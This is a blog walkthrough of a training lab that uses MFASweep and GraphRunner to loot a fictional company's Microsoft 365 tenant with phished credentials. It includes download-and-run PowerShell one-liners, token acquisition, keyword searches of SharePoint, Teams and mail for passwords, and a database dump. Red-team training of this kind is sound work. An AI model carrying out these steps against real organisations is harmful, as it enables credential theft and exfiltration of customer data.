---
title: "Loot Exchange, Teams and SharePoint with GraphRunner"
date: 2024-10-04T10:46:06+01:00
tags: [Azure, Red Teaming, Entra-ID, Powershell, MS SQL]
description: "In this lab, We look ino the use of a tool, Graphrunner, a post-exploitation toolset for interacting with the Microsoft Graph API......:D"
---

**Note : This article was inspired by content from [Pwned Labs](https://pwnedlabs.io/labs/intro-to-azure-recon-with-bloodhound). Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.**

**Lab Link :** [https://pwnedlabs.io/labs/loot-exchange-teams-sharepoint-with-graphrunner](https://pwnedlabs.io/labs/loot-exchange-teams-sharepoint-with-graphrunner)

> Overview -> Your red team is on an engagement and has successfully phished a Mega Big Tech employee to gain their credentials. So far increasing access within Azure has reached a dead end, and you have been tasked with unlocking further access. In scope is the entire on-premises and cloud infrastructure. Your goal is to gain access to customer records and demonstrate impact.



![](https://i.pinimg.com/originals/dd/80/04/dd8004f0c24c16fa33ed20b7a8d33d21.gif)



We have been given compromised user credentials for this lab:


```
Password: xxxxxxxxxxxxxx 

IAM User: Clara.Miller@megabigtech.com 
```



First step is to check if multi-factor authentication is enforced for this set of account

- We can do this using the [MFASweep](https://github.com/dafthack/MFASweep) PowerShell script
- Then we can load this tool to powershell memory as shown below


```powershell
IEX (iwr 'https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1')
```


we can enumerate the presence of MFA on various online Microsoft services with this script, We can also include a check for Active Directory Federated Services in case it is available.

**ADFS (Active Directory Federation Services)** : A Microsoft service for enabling Single Sign-On (SSO) across applications.

- **Federation**: Links identity providers, allowing users to access external services with internal credentials. e.g., Office 365, cloud applications etc
- **Single Sign-On (SSO)** : Users authenticate once and access multiple applications without re-logging in.


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> Invoke-MFASweep -Username Clara.Miller@megabigtech.com -Password [REDACTED] -Recon -IncludeADFS                                   
---------------- MFASweep ----------------
---------------- Running recon checks ----------------
[*] Checking if ADFS configured...
[*] ADFS does not appear to be in use. Authentication appears to be managed by Microsoft.

Confirm MFA Sweep
[*] WARNING: This script is about to attempt logging into the Clara.Miller@megabigtech.com account TEN (10) different times (11 if you included ADFS). If you entered an incorrect password   
this may lock the account out. Are you sure you want to continue?
[Y] Yes  [N] No  [?] Help (default is "Y"):
########################### Microsoft API Checks ###########################

---------------- Microsoft Graph API ----------------
[*] Authenticating to Microsoft Graph API...
[*] SUCCESS! Clara.Miller@megabigtech.com was able to authenticate to https://graph.windows.net
[***] NOTE: The "MSOnline" PowerShell module should work here.


---------------- Azure Service Management API ----------------
[*] Authenticating to Azure Service Management API...
[*] SUCCESS! Clara.Miller@megabigtech.com was able to authenticate to the Azure Service Management API
[***] NOTE: The "Az" PowerShell module should work here.
############################################################################################################


########################### Microsoft Web Portal User Agent Checks ###########################


---------------- Microsoft 365 Web Portal w/ (Windows) User Agent ----------------
[*] Authenticating to Microsoft 365 Web Portal using a (Windows) user agent...
[*] SUCCESS! Clara.Miller@megabigtech.com was able to authenticate to the Microsoft 365 Web Portal. Checking MFA now...
[**] MFA is enabled and was required for this account.
[***] MFA Method Used: PhoneAppOTP
############################################################################################################

---------------- Microsoft 365 Web Portal w/ (Linux) User Agent ----------------
[*] Authenticating to Microsoft 365 Web Portal using a (Linux) user agent...
[*] SUCCESS! Clara.Miller@megabigtech.com was able to authenticate to the Microsoft 365 Web Portal. Checking MFA now...
[**] MFA is enabled and was required for this account.
[***] MFA Method Used: PhoneAppOTP  

########################### Legacy Auth Checks ###########################


---------------- Microsoft 365 Exchange Web Services ----------------
[*] Authenticating to Microsoft 365 Exchange Web Services (EWS)...
[*] Login failed to O365 EWS.


---------------- Microsoft 365 ActiveSync ----------------
[*] Authenticating to Microsoft 365 Active Sync...
InvalidOperation:
Line |
 852 |              $resp = $_.Exception.Response.GetResponseStream()
     |              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     | Method invocation failed because [System.Net.Http.HttpResponseMessage] does not contain a method named 'GetResponseStream'.
[*] Login to ActiveSync failed.
############################################################################################################


############################################################################################################


########################### ADFS Check ###########################


---------------- ADFS Authentication ----------------                                                                                                                                         
[*] Getting ADFS URL...
[*] ADFS does not appear to be in use. Authentication appears to be managed by Microsoft.
[*] Authenticating to On-Prem ADFS Portal at:
######### SINGLE FACTOR ACCESS RESULTS #########
Microsoft Graph API                  | YES
Microsoft Service Management API     | YES
M365 w/ Windows UA                   | NO
M365 w/ Linux UA                     | NO
M365 w/ MacOS UA                     | NO
M365 w/ Android UA                   | NO
M365 w/ iPhone UA                    | NO
M365 w/ Windows Phone UA             | NO
Exchange Web Services (BASIC Auth)   | NO
Active Sync (BASIC Auth)             | NO
ADFS                                 | NO
```


Notice that single-factor authentication (using only a password) is enabled for our current user on both the Microsoft Graph and Microsoft Service Management APIs!


![](https://i.imgur.com/KPZviMM.png)


Microsoft 365 apps like Outlook, Teams, and SharePoint use the Graph API, allowing us to extract valuable user content for our engagement. 

- We can check if our current user has been assigned a Microsoft 365 license.
  - Log in to Azure with `Connect-AzAccount` and `Connect-MgGraph`
  - Then we can check for license availability with the `Get-MgUserLicenseDetail` cmdlet


![](https://i.imgur.com/M4EX7Gs.png)


> The most important information in the above screenshot is the **`SkuPartNumber`** value, which indicates the specific Microsoft 365 license assigned to the user. In this case, **`O365_BUSINESS_ESSENTIALS`** which allows access to Outlook, Teams, SharePoint and other productivity tools, in the Microsoft 365 suite.



- We can use the `GraphRunner` post-exploitation tool to loot in Microsoft 365 environments.
- We can go ahead and load this tool to powershell memory


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> IEX (iwr 'https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1')

  ________                     __      _______      by Beau Bullock (@dafthack)                                
 /_______/___________  ______ |  |____/_______\__ __  ____   ____   ___________ 
/___\  __\______\____\ \_____\|__|__\|________/__|__\/____\ /____\_/____\______\
\    \_\  \  | \// __ \|  |_/ |   Y  \    |   \  |  /   |  \   |  \  ___/|  | \/
 \________/__|  (______/__|   |___|__|____|___/____/|___|__/___|__/\___| >__|   
                 Do service principals dream of electric sheep?
                       
For usage information see the wiki here: https://github.com/dafthack/GraphRunner/wiki
To list GraphRunner modules run List-GraphRunnerModules
```

There is a [blog](https://www.blackhillsinfosec.com/introducing-graphrunner/) by Black Hills Information Security which breaks down how to use this tool.

- We can use the below cmdlet to list the available modules.

```
List-GraphRunnerModules
```


![](https://i.imgur.com/XbKY9df.jpeg)


The **"Pillage Modules"** looks like the most interesting module though as it focuses on post-exploitation techniques. So first of all let go ahead and authenticate as our current user to the Microsoft Graph API.


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> Get-GraphTokens

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code G2XDH6EUF to authenticate.
authorization_pending
aud                 : 00000003-0000-0000-c000-000000000000
iss                 : https://sts.windows.net/2590ccef-687d-493b-ae8d-441cbab63a72/
iat                 : 1728122650
nbf                 : 1728122650
exp                 : 1728126800
acct                : 0
acr                 : 1
aio                 : ATQAy/8YAAAA05ZBUjMFAJilG6sckNXmDe43/GFCaL2t9ywVn2fMbkoY9jVqvVH2NRnZZWQ8Mxna
amr                 : {pwd}
app_displayname     : Microsoft Office
appid               : d3590ed6-52b3-4102-aeff-aad2292ab01c
appidacr            : 0
idtyp               : user
ipaddr              : 102.89.68.17
name                : Clara Miller
oid                 : 36fa333d-1720-4920-8a5c-2b9b696c6adf
--SNIP--
tenant_region_scope : EU
tid                 : 2590ccef-687d-493b-ae8d-441cbab63a72
unique_name         : Clara.Miller@megabigtech.com
upn                 : Clara.Miller@megabigtech.com
uti                 : ColAcrlKl0OTH5BHzLwkAA
ver                 : 1.0
wids                : {88d8e3e3-8f55-4a1e-953a-9b9898b8876b, b79fbf4d-3ef9-4689-8143-76b194e85509}
xms_idrel           : 10 1
xms_tcdt            : 1671311182

[*] Successful authentication. Access and refresh tokens have been written to the global $tokens variable. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)
[!] Your access token is set to expire on: 10/05/2024 12:13:20
```


According to the above output, Some modules will require you use the `-Tokens $tokens` option, Just in case you don't know what tokens are refer to this [blog](https://www.xintra.org/blog/tokens-in-entra-id-guide) by [@inversecos](https://x.com/inversecos) to understand more.



![](https://i.imgur.com/zQt1ulT.jpeg)



It is also possible to view the help page just like the `--help` option in bash but this time with the below command syntax starting with first **Pillage Module**


```
Get-Help Invoke-SearchSharePointAndOneDrive -Examples
```

![](https://i.imgur.com/MoZhYop.png)


We can then execute this module to search for files containing the string "**`password`**".


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password'

[*] Using the provided access tokens.
[*] Found 2 matches for search term password
Result [0]
File Name: passwords.xlsx
Location: https://iancloudpwned.sharepoint.com/Shared Documents/passwords.xlsx
Created Date: 03/27/2024 00:13:10
Last Modified Date: 09/23/2024 21:02:42
Size: 14.79 KB
File Preview: <c0>passwords</c0> Site Username <c0>Password</c0> Azure lindsey_adm $R4ncher2043 Dev Env r&d $MEGAPRODUCTS-<ddd/>
DriveID & Item ID: b!bT4vhymq0UWW7LvQnMzGLIicHuknVeZGkE3-8tuCtaeO-nKW9TKYT7NHHw0ABSux\:017K7QPLPAKVIRHIULQ5BK6A3KQTCK2SCD
================================================================================
Result [1]
File Name: Finance Logins.docx
Location: https://iancloudpwned.sharepoint.com/sites/FinanceTeam/Shared Documents/Finance Logins.docx
Created Date: 11/06/2023 00:17:46
Last Modified Date: 11/06/2023 00:17:00
Size: 20.74 KB
File Preview: <ddd/><c0>PASSWORDS</c0>) Service/Account: Finance Database URL: https://10.10.11.15/login Username: <ddd/> <c0>Password</c0>: F1n@nc3Db2023! Service/Account: Accounting Software URL: https://accounting.<ddd/>
DriveID & Item ID: b!XM0yHkS8s0KPA7drboV7c7bd4PO1jD1BpS2fN8axCu6HW_Ya2jEcSZSebeuGuDsI\:01UALFMSZAKNKICFDDHRH2II4AID3NQRGJ
================================================================================
[*] Do you want to download any of these files? (Yes/No/All)
All
[***] WARNING - Downloading ALL + 2 matches.
[*] Now downloading passwords.xlsx
[*] Now downloading Finance Logins.docx
[*] Do you want to download any more files? (Yes/No/All)
No
[*] Quitting...
```

As shown above we have two file retrieved the **`passwords.xlsx`** file and the **`Finance Logins.docx`** both hosted on the SharePoint site. We also downloaded the files by selecting **`All`** when prompted for a response.


Checking each of this files we have hardcoded embedded credentials in which these logins can provide access to sensitive systems and data, and may also allow server access through abusable functionalities like file uploads or application vulnerabilities.

***`Finance Logins.docx ::`***

![](https://i.imgur.com/LO9VDmz.png)


***`passwords.xlsx ::`***

![](https://i.imgur.com/glYJsKS.png)


We can also search for other sensitive files using the search term 'bonus'.


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'bonus'

[*] Using the provided access tokens.
[*] Found 1 matches for search term bonus
Result [0]
File Name: Bonuses - Confidential.xlsx
Location: https://iancloudpwned-my.sharepoint.com/personal/sam_olsson_megabigtech_com/Documents/Bonuses - Confidential.xlsx
Created Date: 11/05/2023 21:50:58
Last Modified Date: 11/05/2023 21:50:58
Size: 17.50 KB
File Preview: 
DriveID & Item ID: b!qFVO5o9Td0OqTdtkAzLcOeLC9xqzoSxNgtanvmZOWlEk66ey-hWeTL_LW84ry4xf\:01LMH7HCXMTDF5WDES3ZF3IDWGRV2P4OXB
================================================================================
[*] Do you want to download any of these files? (Yes/No/All)
Yes
[*] Enter the result number(s) of the file(s) that you want to download. Ex. "0,10,24"
0
[*] Now downloading Bonuses - Confidential.xlsx
[*] Do you want to download any more files? (Yes/No/All)                                                                
No                                                                                                                      
[*] Quitting...
```


As shown above a `Bonuses - Confidential.xlsx` was downloaded and trying to open this file we get the below message 

![](https://i.imgur.com/FTu2Nrr.png)


After trying all passwords we have gotten so far in which did not work, i decided to enumerate other Microsoft 365 services, starting with the `Invoke-SearchTeams` pillage module which searches for all Teams messages in all channels that are readable by the current user.


```powershell
Invoke-SearchTeams -Tokens $tokens -SearchTerm password
```


![](https://i.imgur.com/jBmsrQv.png)


As shown above i was able to get some passwords which worked and had access to the encrypted document.


![](https://i.imgur.com/UcyjNfz.png)


It is also worth searching the mailbox of our current user using the `Invoke-SearchMailbox` in this context the user '`Clara.Miller'


```powershell
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 40
```


![](https://i.imgur.com/sLVt8gt.png)


As shown above we got an image preview showing a username and password of the `mbt-finance.database.windows.net` server including DB named `Finance`. According to [@pwnedlabs](https://pwnedlabs.io/) article the use of powershell and VS Code where implemented, But in this article, would show you how to use `dbeaver`, A community DB management tool.

First of all download the tool using the apt package manager as shown below 


```
sudo apt install dbeaver
```


Then open up `dbeaver` and if you don't get the pop-up as shown in the below image use the hotkey **`shift+ctrl+N`** to open up the window and use the search term **`Azure`** then select "Azure SQL Server"  


![](https://i.imgur.com/xnDRx23.png)


Enter the connection details in the next window including the DB name, Credentials and Host name, Then click **`Finish`** once done.


![](https://i.imgur.com/ynueZ4K.png)


If there was a successful host connection, you should see a drop down of different databases as shown below


![](https://i.imgur.com/RMz7ky2.png)


We are mostly interested in the sequence; **`Database`** > **`Finance`** > **`Schemas`** > **`dbo`** > **`Tables`** > **`Subscriber`** > **`Columns`**. Where sensitive credentials are stored.


![](https://i.imgur.com/ULhJCkd.png)


The best thing to do is to export the data in the **`Subscribers`** table so go ahead and right click on this table and select "**`Export Data`**".


![](https://i.imgur.com/iA3nj41.png)


You should have a data transfer page, Go ahead and select which format you would like the data to be exported as, I love to use the JSON format, so i will go ahead and chose that.

![](https://i.imgur.com/lpJjDsz.png)

Then select **`Next`** with the default values until you get to the final page and hit **`Proceed`** to finally export the data to your user home folder.


![](https://i.imgur.com/4KGAj3k.png)


You should get the prompt, completed,  when the exportation is done and you can now view the exported data as shown below. Go ahead and submit the flag to complete the lab. 



![](https://i.imgur.com/YtPKL6l.png)


Be cool ⋆˚🐾˖°